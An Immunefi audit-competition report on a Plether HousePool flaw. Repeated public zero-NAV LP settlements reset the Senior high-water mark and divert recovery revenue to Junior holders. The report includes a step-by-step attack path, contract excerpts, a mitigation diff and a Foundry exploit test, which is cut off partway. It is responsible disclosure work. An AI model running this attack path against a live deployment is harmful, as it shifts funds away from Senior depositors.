# \#99404 [SC-High] Permissionless LP Settlement Resets Senior High-Water Mark and Diverts Recovery Revenue to Junior

**Submitted on Nov 13th 2026 at 14:21:58 UTC by @xRakan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99404
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Summary

`HousePool.settleLpEpoch` performs `_reconcile` before it processes matured LP requests. A legitimate, partial owner-funded recapitalization first leaves Senior principal at 500,226.531744 USDG, its high-water mark (HWM) at 1,000,453.063488 USDG, and a 500,226.531744 USDG recapitalization bucket still pending. An ordinary Junior LP can create a second matured, zero-NAV redemption and call the public Router settlement. That second reconciliation consumes the residual bucket without receiving or moving cash, but resets the Senior HWM to 500,226.531744 USDG.

The same ordinary losing trader then realizes 146,625.840973 USDG into the Pool. In a matched branch without the second zero-NAV settlement, that amount restores Senior principal. In the triggered branch, Senior remains at 500,226.531744 USDG and Junior is credited 125,056.632936 USDG; the attacker also receives 21,569.208037 USDG in an actual vault claim. This is a real change in ownership allocation, not just an HWM field change.

This report covers only the HWM reset and resulting Senior-to-Junior recovery diversion. `unassignedAssets` is zero in both branches; no deposit freeze, ownerless-asset claim, or permanent lock is asserted.

## Root Cause

After each reconciliation, `_decreasePendingClaimantBuckets` subtracts the amount settled from `pendingRecapitalizationAssets`. On the first partial application the helper receives the full 1,000,453.063488 USDG intent and sets the bootstrap HWM to that amount. The remaining pending amount is then 500,226.531744 USDG. On the second pass, `_getPendingClaimantBuckets` returns only that residual amount. If the reconcile plan has again reduced both stored principals to zero, the library's empty-Senior bootstrap sets `seniorHighWaterMark = max(residualIntent, settledAmount)`, replacing the higher HWM with the smaller residual target.

The public settlement path reaches this helper before any LP request is processed. The second request refunds its zero-NAV shares; the HWM change occurs in the preceding reconciliation and leaves raw Pool cash, `accountedAssets`, and Senior principal unchanged.

The root cause is the use of the **current residual bucket as the original recapitalization recovery target** across multiple partial settlements. The pinned implementation caps how much can be applied, but does not retain the original aggregate target for subsequent applications.

### Pinned source excerpts

`OrderRouter.settleLpEpoch(bytes[])` is an external payable entrypoint. The production Router updates the mark and calls the Pool settlement route atomically. [Pinned `OrderRouter.sol` lines 474–484](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484).

`HousePool.settleLpEpoch` checks the settlement pause, requires the Router-bound exact mark only while live positions exist, then enters `_settleLpEpoch`; `_settleLpEpoch` validates withdrawal liveness and freshness and calls `_reconcile` before LP processing. [Pinned `HousePool.sol` lines 794–840](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L840).

The live reconcile reads the pending buckets, plans the waterfall, and applies the settleable amounts. The residual is subtracted after each pass. [Pinned `HousePool.sol` lines 1555–1598 and 1759–1803](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1598).

The library passes the outstanding recap intent as the bootstrap target. On an empty Senior/Juniors waterfall it overwrites the HWM with the larger of that target and the current settled amount. [Pinned `HousePoolPendingPreviewLib.sol` lines 40–52 and 103–128](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L40-L52).

Governance recapitalization and degraded-mode recovery are owner-only, documented actions. The PoC performs them as setup prerequisites, separately from the attacker path. `recapitalizePool` transfers exact USDG from the owner and records the inflow; `clearDegradedMode` requires recovery of the solvency condition. [Pinned `CfdEngine.sol` lines 632–665](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L665).

The attacker's redemption is an ordinary `TrancheVault.requestRedeem` from its own pre-crisis shares. The one-hour deposit cooldown and epoch maturity are enforced by production code. [Pinned `TrancheVault.sol` lines 38–40 and 606–632](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L38-L40).

### Exact Solidity excerpts

The production Router exposes the atomic settlement entrypoint publicly:

[OrderRouter.sol, pinned lines 479–484](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L479-L484)

```solidity
function settleLpEpoch(
    bytes[] calldata pythUpdateData
) external payable nonReentrant {
    pythUpdateData;
    _delegateToKeeperSidecar();
}
```

The Pool permits non-Router callers when there are no open positions. The settlement body then reconciles before LP processing:

[HousePool.sol, pinned lines 797–820 and 829–836](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L797-L836)

```solidity
function settleLpEpoch(
    uint256 expectedMarkPrice,
    uint256 expectedPublishTime
) external override nonReentrant returns (IHousePool.LpEpochSettlementResult memory result) {
    if (lpEpochSettlementPaused) {
        revert HousePool__LpEpochSettlementPaused();
    }
    (
        HousePoolEngineViewTypes.HousePoolInputSnapshot memory accountingSnapshot,
        HousePoolEngineViewTypes.HousePoolStatusSnapshot memory statusSnapshot
    ) = _getHousePoolSnapshots();
    uint256 cutoffEpoch = block.timestamp / LP_EPOCH_DURATION;
    if (accountingSnapshot.hasOpenPositions && !statusSnapshot.oracleFrozen) {
        if (
            msg.sender != ENGINE.orderRouter() || ENGINE.lastMarkPrice() != expectedMarkPrice
                || statusSnapshot.lastMarkTime != expectedPublishTime
        ) {
            revert HousePool__Unauthorized();
        }
        if (expectedPublishTime / LP_EPOCH_DURATION < cutoffEpoch) {
            revert HousePool__MarkPriceStale();
        }
    }
    return _settleLpEpoch(accountingSnapshot, statusSnapshot, cutoffEpoch);
}
```

At the start of `_settleLpEpoch`, before LP epoch processing, the body runs these checks and reconciliation:

[HousePool.sol, pinned lines 829–836](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L829-L836)

```solidity
_requireWithdrawalsLive(statusSnapshot);
_requireFreshMark(accountingSnapshot, statusSnapshot);
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();
```

The pending recap target is the current pending amount. Partial settlement decreases that same amount:

[HousePool.sol, pinned lines 1778–1803](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1778-L1803)

```solidity
function _getPendingClaimantBuckets()
    internal
    view
    returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory buckets)
{
    buckets.recapitalizationAssets = pendingRecapitalizationAssets;
    buckets.revenueAssets = pendingTradingRevenueAssets;
}

function _decreasePendingClaimantBuckets(
    HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
) internal {
    pendingRecapitalizationAssets -= claimantBuckets.recapitalizationAssets;
    pendingTradingRevenueAssets -= claimantBuckets.revenueAssets;
}
```

When both stored principals are zero, the recap helper assigns the current settled amount and replaces the HWM with the supplied target:

[HousePoolPendingPreviewLib.sol, pinned lines 111–136](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L136)

```solidity
function applyClaimantRecapitalizationIntent(
    PendingAccountingState memory state,
    uint256 amount,
    uint256 recapitalizationTargetAssets
) internal pure {
    uint256 remaining = amount;
    if (state.seniorSupply > 0) {
        if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
            state.waterfall.seniorPrincipal += remaining;
            state.waterfall.seniorHighWaterMark =
                recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
            remaining = 0;
        } else {
            uint256 gap = state.waterfall.seniorHighWaterMark > state.waterfall.seniorPrincipal
                ? state.waterfall.seniorHighWaterMark - state.waterfall.seniorPrincipal
                : 0;
            if (gap > 0) {
                uint256 seniorAssignedAssets = remaining > gap ? gap : remaining;
                state.waterfall.seniorPrincipal += seniorAssignedAssets;
                remaining -= seniorAssignedAssets;
            }
        }
    }
    if (remaining > 0) {
        state.unassignedAssets += remaining;
    }
}
```

The recapitalization itself is an owner-only, exact-transfer operation. This is a governance prerequisite in the PoC, not an attacker action:

[CfdEngine.sol, pinned lines 632–652](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L652)

```solidity
function recapitalizePool(
    uint256 amountAssets
) external onlyOwner nonReentrant {
    if (amountAssets == 0) {
        revert CfdEngine__ZeroAmount();
    }
    if (address(pool) == address(0)) {
        revert CfdEngine__InvalidPool();
    }
    _advanceAllCarryIndexes(block.timestamp);
    uint256 balanceBefore = settlementToken.balanceOf(address(pool));
    settlementToken.safeTransferFrom(msg.sender, address(pool), amountAssets);
    uint256 balanceAfter = settlementToken.balanceOf(address(pool));
    uint256 received = balanceAfter >= balanceBefore ? balanceAfter - balanceBefore : 0;
    if (received != amountAssets) {
        revert CfdEngine__UnexpectedTransferAmount(amountAssets, received);
    }
    pool.recordClaimantInflow(
        amountAssets, IHousePool.ClaimantInflowKind.Recapitalization, IHousePool.ClaimantInflowCashMode.CashArrived
    );
    emit PoolRecapitalized(msg.sender, amountAssets);
}
```

## Attack Path and Public Reachability

1. **Attacker acquires Junior shares before the incident.** It deposits 1,000,000 USDG through the public asynchronous Junior deposit queue, settles the matured request through the production Router, and claims its shares through the vault. The PoC asserts the shares exist before any crisis trades. No victim share transfer or cooperative seller is used.
2. **External market events and ordinary trades produce an insolvency.** Four separately funded trader accounts open V3 orders through `OrderRouter.commitOrder(OrderV3Types.OrderRequest)` and execute through `executeOrder`. At basket mark 2.00, paid trader outflows reduce Pool cash from 1,100,002.000000 to 44,355.050697 USDG while a 1,090,000 USDG long liability remains and degraded mode latches. At mark 0.50, the remaining positions close and record 544,581.582441 USDG of unpaid trader claims. All positions are closed before the settlement that triggers the finding.
3. **Governance performs documented recovery.** The owner funds 1,000,453.063488 USDG through `CfdEngine.recapitalizePool`. Long claimants settle their own 544,581.582441 USDG claims. Pool cash is then 500,226.531744 USDG. Once liabilities and positions are gone, the owner clears degraded mode. These privileged actions are prerequisites, not attacker actions.
4. **First public zero-NAV settlement applies a partial recap.** The attacker requests redemption of its Junior shares, waits for the one-hour epoch, and calls the public Router settlement with a fresh, validated basket mark. The redemption is refunded because Junior NAV is zero, but its matured queue item makes settlement progress. After reconciliation, Senior principal is 500,226.531744, HWM is 1,000,453.063488, and pending recap is 500,226.531744 USDG.
5. **Second public zero-NAV settlement resets the HWM.** The attacker makes a second matured zero-NAV redemption and again calls the public Router. The public settlement runs `_reconcile` before the redemption phase. Senior principal and cash remain 500,226.531744 USDG, but HWM falls to 500,226.531744 and the pending bucket clears. The test logs the balances at this exact point.
6. **Same ordinary trader loss, matched against a control.** A separately funded trader opens a 195,000-unit SHORT at 1.00 with 190,000 USDG margin, then closes at 0.25. It has no unpaid claim; the Pool gains 146,625.840973 USDG including protocol accounting charges. The control restores this same amount to Senior because its HWM remains 1,000,453.063488. The triggered branch leaves Senior at 500,226.531744 and credits Junior.
7. **Attacker claims actual proceeds.** After the same cooldown and maturity, the attacker redeems its pre-crisis Junior shares through the public queue and claims 21,569.208037 USDG from the Junior vault. Remaining shares stay in the redemption queue; their 125,056.486601 USDG estimate is a quote inside Pool assets, not a second cash balance or a guaranteed payout.

### Authorization and runtime gates

- The attacker never impersonates an owner, vault, Engine, or Router. Its calls are public Junior-vault requests, public Router order/settlement calls, and its own claims. The V3 router is deployed as `new OrderRouter`; the BasePerpTest return type is used only at the fixture boundary, and no scalar test-adapter method is called.
- The recapitalization and `clearDegradedMode` calls are made by the legitimate owner during setup. The former transfers owner-held mock USDG into the real Pool path; test-only minting provisions the owner and traders, not the Pool.
- The crisis closes every position and settles every trader claim before the HWM-triggering settlement. `degradedMode == false`, `hasOpenPositions == false`, `HousePool.paused() == false`, and `lpEpochSettlementPaused == false` are asserted by the PoC.
- The attacker uses the production `OrderRouter.settleLpEpoch(bytes[])`, which atomically refreshes the mark from the configured six-feed basket and calls `HousePool.settleLpEpoch`. The mark timestamp is current and the test asserts it is fresh for the matured epoch. No direct `HousePool.reconcile()` call is used by the attacker.
- `TrancheVault.DEPOSIT_COOLDOWN` is one hour, and `HousePool.LP_EPOCH_DURATION` is one hour. The PoC calls `requestRedeem`, waits through `pool.lpEpochStart`, and the zero-NAV request is processed/refunded. It therefore makes progress and does not revert with `HousePool__NoLpEpochProgress`; that revert only occurs when no redemption/deposit epoch progresses. [Pinned `HousePool.sol` lines 1179–1189 and `TrancheVault.sol` lines 1431–1443](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1179-L1189).
- Pyth is modeled locally with `MockPyth` and the release feed IDs, weights, bases, and inversions. The PoC does not claim the attacker can publish or manipulate real Pyth prices. In deployment, a public caller needs a valid current Pyth update and must pay its update fee; the mock fee and gas cost are not monetized here.

## Measured Impact and Matched Control

All amounts below are USDG. Pool and accounting amounts are in 6-decimal token units; the PoC logs raw values as integers.

| Final measure | Triggered branch | Matched control |
|---|---:|---:|
| Senior principal | 500,226.531744 | 646,852.372717 |
| Senior HWM | 500,226.531744 | 1,000,453.063488 |
| Junior principal | 125,056.632936 | 0 |
| Pool `totalAssets` | 625,283.164680 | 646,852.372717 |
| Pool raw USDG balance | 625,283.164680 | 646,852.372717 |
| Pool `accountedAssets` | 625,283.164680 | 646,852.372717 |
| `unassignedAssets` / trader claims / pending recap / pending revenue | 0 / 0 / 0 / 0 | 0 / 0 / 0 / 0 |
| Senior share quote | 500,226.531739 | 646,852.372711 |
| Junior share quote | 125,056.632936 | 0 |
| Attacker's actual USDG payout | 21,569.208037 | 0 |
| Attacker's remaining queued shares, quoted | 125,056.486601 | 0 |
| Junior vault escrow cash | 0 | 0 |

Senior's measured principal is lower by **146,625.840973 USDG**, exactly the sum of the triggered branch's 125,056.632936 Junior principal and the 21,569.208037 USDG actually paid to the attacker. The attack branch's total is conserved: `625,283.164680 Pool + 21,569.208037 attacker wallet = 646,852.372717`, which equals the control Pool balance. The remaining queued share quote is already represented inside the Pool and is not added again. `accountedAssets` equals raw Pool token custody in both branches; the control and attack also end with identical clearinghouse custody, trader balances, token supply, no open positions, and no unpaid trader claims.

The attacker's cost basis is the full **1,000,000 USDG** deposited before the crisis. It has no trading position and pays no LP fee in this non-frozen path. The local MockPyth charges no update fee; live Pyth fees and gas are not estimated. The triggered branch's actual payout plus quoted queued shares is 146,625.694638 USDG, so the attacker remains down 853,374.305362 USDG against its original cost basis. This report does not claim net attacker profit. Relative to the otherwise identical control, the attacker's shares are worth zero and it receives no payout; the triggered branch gives it a 21,569.208037 USDG transfer and a pending Junior redemption quote. The remainder of the 146,625.840973 USDG Junior claim is represented by seed shares/rounding and is not counted as attacker cash.

The adverse impact is the demonstrated loss of Senior's recovery priority and the real Junior allocation/payout, not a cash deficit, accounting imbalance, deposit freeze, or permanent freeze of a claimant.

## Mitigation

Retain the original aggregate owner-funded recapitalization target while any portion of that recap remains pending. Increment the stored target when a new recap is recorded, pass it to both pending-state preview and live application, and clear it only after the recap bucket reaches zero. The existing partial-settlement cap remains in place. This preserves intended fresh-wipeout recap behavior and prevents a later residual replay from lowering the HWM.

The following complete diff was applied only in the separate mitigation checkout; production code in the pinned reproduction remained unchanged:

```diff
diff --git a/packages/perps/src/HousePool.sol b/packages/perps/src/HousePool.sol
index fceb093d..c9cb2d72 100644
--- a/packages/perps/src/HousePool.sol
+++ b/packages/perps/src/HousePool.sol
@@ -157,6 +157,9 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
     uint256 public unassignedAssets;
     /// @notice Unsettled claimant recapitalization intent reserved from withdrawals (6-decimal settlement token).
     uint256 public pendingRecapitalizationAssets;
+    /// @dev Original aggregate recapitalization target retained while any portion remains pending.
+    ///      A residual bucket alone is not the original Senior recovery target after partial settlement.
+    uint256 internal pendingRecapitalizationTargetAssets;
     /// @notice Unsettled claimant trading revenue reserved from withdrawals (6-decimal settlement token).
     uint256 public pendingTradingRevenueAssets;
     /// @notice Accepted senior delayed-deposit assets not yet cancelled or finalized (6-decimal settlement token).
@@ -1670,7 +1673,11 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
         }
 
         HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
-            pendingState, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
+            pendingState,
+            settleableClaimantBuckets,
+            claimantBuckets,
+            allowRevenueContinuation,
+            pendingRecapitalizationTargetAssets
         );
     }
 
@@ -1767,7 +1774,11 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
 
         HousePoolPendingPreviewLib.PendingAccountingState memory state = _currentPendingAccountingState();
         HousePoolPendingPreviewLib.applyPendingClaimantBucketsPreview(
-            state, settleableClaimantBuckets, claimantBuckets, allowRevenueContinuation
+            state,
+            settleableClaimantBuckets,
+            claimantBuckets,
+            allowRevenueContinuation,
+            pendingRecapitalizationTargetAssets
         );
         _decreasePendingClaimantBuckets(settleableClaimantBuckets);
 
@@ -1789,6 +1800,9 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
     ) internal {
         pendingRecapitalizationAssets -= claimantBuckets.recapitalizationAssets;
         pendingTradingRevenueAssets -= claimantBuckets.revenueAssets;
+        if (pendingRecapitalizationAssets == 0) {
+            pendingRecapitalizationTargetAssets = 0;
+        }
     }
 
     function _recordPendingClaimantInflow(
@@ -1797,6 +1811,7 @@ contract HousePool is IHousePool, IPerpsLPActions, Ownable2Step, Pausable, Reent
     ) internal {
         if (kind == IHousePool.ClaimantInflowKind.Recapitalization) {
             pendingRecapitalizationAssets += amount;
+            pendingRecapitalizationTargetAssets += amount;
         } else {
             pendingTradingRevenueAssets += amount;
         }
diff --git a/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol b/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol
index ce85967b..e06ffbce 100644
--- a/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol
+++ b/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol
@@ -35,17 +35,19 @@ library HousePoolPendingPreviewLib {
     ///      place; it does not decrement either input bucket.
     /// @param state In-memory accounting state to update.
     /// @param claimantBuckets Settleable recapitalization and revenue amounts to apply.
-    /// @param claimantIntentBuckets Full outstanding intent used to establish the recapitalization bootstrap target.
+    /// @param claimantIntentBuckets Full outstanding intent used to establish the recapitalization bootstrap path.
     /// @param allowRevenueContinuation Whether revenue may be routed into already-claimed waterfall equity.
+    /// @param recapitalizationTargetAssets Original aggregate owner-funded recap intent retained across partial settlement.
     function applyPendingClaimantBucketsPreview(
         PendingAccountingState memory state,
         ClaimantPendingBuckets memory claimantBuckets,
         ClaimantPendingBuckets memory claimantIntentBuckets,
-        bool allowRevenueContinuation
+        bool allowRevenueContinuation,
+        uint256 recapitalizationTargetAssets
     ) internal pure {
         if (claimantBuckets.recapitalizationAssets > 0) {
             applyClaimantRecapitalizationIntent(
-                state, claimantBuckets.recapitalizationAssets, claimantIntentBuckets.recapitalizationAssets
+                state, claimantBuckets.recapitalizationAssets, recapitalizationTargetAssets
             );
             // Recapitalization can restore a claimant path for revenue in this same batch.
             allowRevenueContinuation =
@@ -117,6 +119,8 @@ library HousePoolPendingPreviewLib {
         if (state.seniorSupply > 0) {
             if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
                 state.waterfall.seniorPrincipal += remaining;
+                // Keep the original aggregate target while a recap settles in slices; the remaining bucket is not
+                // the target for a later empty-Senior bootstrap.
                 state.waterfall.seniorHighWaterMark =
                     recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
                 remaining = 0;
```

## References
- Frozen source: [Immunefi Plether audit repository at the pinned commit](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8).
- [HousePool settlement and reconciliation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L794-L840), [pending claimant buckets](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1803), and [recapitalization HWM bootstrap](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L128).
- [Production Router V3 order and public settlement entrypoints](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L85-L99) and [atomic LP settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L474-L484).
- [Owner-funded recapitalization and degraded-mode recovery](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol#L632-L665).
- [Asynchronous tranche requests and epoch settlement](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L632), [release parameters](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md#L128-L168), and [accounting waterfall specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340).
- [Competition scope, severity categories, and previous-finding eligibility rule](https://immunefi.com/audit-competition/plether/scope/).
- Prior reports: [SC Audit Studio pre-audit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf) and [Cecuro AI audit](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf).


## Proof of Concept

## Proof of Concept
## Full Inline Foundry PoC

Save this complete file as `poc/SeniorHwmRecoveryDiversionPoC.t.sol` in the clean checkout and use the commands above.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {LegacyOrderRouterHarness} from "../packages/perps/test/utils/LegacyOrderRouterHarness.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

contract SeniorHwmRecoveryDiversionPoCTest is BasePerpTest {
    address internal constant ATTACKER = address(0xA7701);
    address internal constant LONG_A = address(0xA1001);
    address internal constant LONG_B = address(0xA1002);
    address internal constant SHORT_A = address(0xB1001);
    address internal constant SHORT_B = address(0xB1002);
    address internal constant LOSS_TRADER = address(0xC1001);
    address internal constant KEEPER = address(0xD1001);

    OrderRouter internal productionRouter;
    PletherOracle internal releaseOracle;

    struct Outcome {
        uint256 senior;
        uint256 seniorHwm;
        uint256 junior;
        uint256 pendingRecap;
        uint256 pendingRevenue;
        uint256 unassigned;
        uint256 poolAssets;
        uint256 poolTokenBalance;
        uint256 juniorEscrowAssets;
        uint256 juniorEscrowShares;
        uint256 seniorEscrowAssets;
        uint256 seniorShareQuote;
        uint256 juniorShareQuote;
        uint256 attackerPayout;
        uint256 attackerShares;
        uint256 attackerInvestment;
        uint256 attackerWallet;
        uint256 attackerClearinghouseBalance;
        uint256 attackerRedeemRequestId;
        uint256 pendingRedeemShares;
        uint256 pendingRedeemQuote;
        uint256 claimableRedeemShares;
        uint256 clearinghouseCustody;
        uint256 totalTraderClaims;
        uint256 accountedAssets;
        uint256 tokenSupply;
        uint256 longASettlement;
        uint256 longBSettlement;
        uint256 shortASettlement;
        uint256 shortBSettlement;
        uint256 shortAClaim;
        uint256 shortBClaim;
        uint256 lossTraderSettlement;
        uint256 lossTraderClaim;
        uint256 ownerBalance;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory params) {
        params = super._riskParams();
        params.vpiFactor = 0.01e18;
        params.maintMarginBps = 10;
        params.initMarginBps = 20;
    }

    function setUp() public override {
        super.setUp();
        productionRouter = OrderRouter(address(router));

        bytes32[] memory feedIds = _releaseFeedIds();
        uint256[] memory weights = _releaseWeights();
        uint256[] memory bases = _releaseBasePrices();
        releaseOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), feedIds, weights, bases, _releaseInversions()
        );
        OrderRouterAdmin(productionRouter.admin()).proposeOracleConfig(
            IOrderRouterAdminHost.OracleConfig({pletherOracle: address(releaseOracle)})
        );
        vm.warp(OrderRouterAdmin(productionRouter.admin()).oracleConfigActivationTime());
        OrderRouterAdmin(productionRouter.admin()).finalizeOracleConfig();
        pletherOracle = releaseOracle;

        IOrderRouterAdminHost.RouterConfig memory releaseRouterConfig = _routerConfig();
        releaseRouterConfig.minOpenNotionalAssets = 1_000e6;
        releaseRouterConfig.adverseConfidenceMultiplierBps = 2_500;
        releaseRouterConfig.maxPendingOrders = 5;
        _setRouterConfig(releaseRouterConfig);

        IHousePool.PoolConfig memory releaseConfig = _currentPoolConfig();
        releaseConfig.maxSeniorExposureAssets = 40_000_000e6;
        releaseConfig.maxSeniorShareBps = 8_000;
        pool.proposePoolConfig(releaseConfig);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        assertEq(engine.orderRouter(), address(productionRouter), "Engine is bound to production OrderRouter code");
        assertEq(address(productionRouter.pletherOracle()), address(releaseOracle), "Router uses the six-feed FX basket");
        assertEq(engine.CAP_PRICE(), 2e8, "production price cap is active");
        assertEq(engine.settlementBufferBps(), 25, "production settlement buffer is active");
        assertFalse(OrderRouterAdmin(productionRouter.admin()).paused(), "production Router starts unpaused");
    }

    function _deployLegacyOrderRouter(address engine_, address engineLens_, address pool_, address oracle_)
        internal
        override
        returns (LegacyOrderRouterHarness deployedRouter)
    {
        // BasePerpTest stores this address using its legacy adapter type. The deployed runtime is the plain
        // production OrderRouter above; every order below uses commitOrder(OrderRequest) and no scalar adapter call.
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook = new OrderLifecycleBook(
            predictedRouter, engine_, address(clearinghouse), pool_
        );
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        OrderRouter production = new OrderRouter(
            engine_,
            engineLens_,
            pool_,
            oracle_,
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(production), predictedRouter, "production V3 Router matches its immutable sidecar bindings");
        deployedRouter = LegacyOrderRouterHarness(address(production));
    }

    function test_ProductionV3TradingCreatesWipeoutClaimAndPublicHwmDiversion() public {
        (uint256 recapSlice,, uint256 attackerInvestment) = _preparePartialRecoveryState();

        uint256 matchedStart = vm.snapshotState();
        uint256 attackStartTime = block.timestamp;
        Outcome memory attack = _runAttackBranch(attackStartTime, recapSlice, attackerInvestment);
        assertTrue(vm.revertToState(matchedStart), "revert to identical post-partial-recap state for control");
        Outcome memory control = _runControlBranch(attackStartTime, recapSlice, attackerInvestment);

        _logOutcome("ATTACK", attack);
        _logOutcome("CONTROL", control);

        assertLt(attack.seniorHwm, control.seniorHwm, "attack branch lowers HWM relative to matched control");
        assertGt(control.senior, attack.senior, "control restores more Senior principal from the same revenue");
        assertEq(control.senior - attack.senior, attack.junior + attack.attackerPayout,
            "value withheld from Senior is split between remaining Junior principal and paid redemption");
        assertGt(attack.junior, 0, "new trading losses accrue to Junior only after reset");
        assertEq(control.junior, 0, "matched control routes the same revenue to impaired Senior");
        assertGt(attack.attackerPayout, 0, "attacker claims actual Junior redemption proceeds");
